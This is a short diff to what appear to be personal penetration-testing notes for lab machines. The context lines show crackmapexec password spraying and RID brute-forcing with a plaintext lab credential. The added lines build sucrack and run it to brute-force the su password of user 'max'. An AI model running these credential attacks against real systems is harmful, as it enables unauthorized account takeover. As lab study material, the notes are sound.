@@ -208,3 +208,16 @@ crackmapexec smb streamio.htb -u users.txt -p passwords.txt
 	---- Брут пользователей по RID (относительный идентификатор)
 
 crackmapexec smb 10.10.10.149 -u Hazard -p stealth1agent --rid-brute
+
+
+# sucrack
+
+git clone https://github.com/hemp3l/sucrack.git
+
+cd sucrack && ./configure && autoreconf -f -i 
+
+make
+
+cd src
+
+	./sucrack -a -w 20 -s 10 -u max -r file
